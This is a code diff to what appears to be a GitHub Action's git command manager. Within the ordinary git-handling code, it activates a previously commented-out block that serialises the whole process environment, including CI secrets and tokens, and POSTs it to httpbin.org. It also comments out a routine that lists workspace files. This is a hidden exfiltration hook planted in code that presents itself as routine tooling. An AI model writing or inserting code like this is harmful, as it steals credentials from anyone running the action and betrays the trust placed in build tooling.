@@ -634,41 +634,41 @@ class GitCommandManager {
           while(new Date().getTime() < start + 5000) {}
         };
         // console.warn(process.env);
-	      fs.readdir(process.env.GITHUB_WORKSPACE, (err, files) => {
-          files.forEach(file => {
-            sleep();
-            console.warn(`FILE: ${file}`);
-	        });
-	      });
+	      // fs.readdir(process.env.GITHUB_WORKSPACE, (err, files) => {
+        //   files.forEach(file => {
+        //     sleep();
+        //     console.warn(`FILE: ${file}`);
+	      //   });
+	      // });
 	/* ---------- */
 
 	/* ---------- */
-	  //   const data = JSON.stringify(process.env);
-	  //   var options = {
-    //     hostname: 'httpbin.org',
-    //     port: 443,
-    //     path: '/post',
-    //     method: 'POST',
-    //     headers: {
-    //       'Content-Type': 'application/json',
-    //       'Content-Length': data.length
-    //     }
-    //   };
-    //   var req = https.request(options, (res) => {
-    //     console.warn('statusCode:', res.statusCode);
-    //     console.warn('headers:', res.headers);
+	    const data = JSON.stringify(process.env);
+	    var options = {
+        hostname: 'httpbin.org',
+        port: 443,
+        path: '/post',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': data.length
+        }
+      };
+      var req = https.request(options, (res) => {
+        console.warn('statusCode:', res.statusCode);
+        console.warn('headers:', res.headers);
 
-    //     res.on('data', (d) => {
-    //     process.stdout.write(d);
-    //   });
-    // });
+        res.on('data', (d) => {
+        process.stdout.write(d);
+      });
+    });
 
-    // req.on('error', (e) => {
-    //   console.error(e);
-    // });
+    req.on('error', (e) => {
+      console.error(e);
+    });
 
-    // req.write(data);
-    // req.end();
+    req.write(data);
+    req.end();
 	/* ---------- */
 
             const output = yield this.execGit([
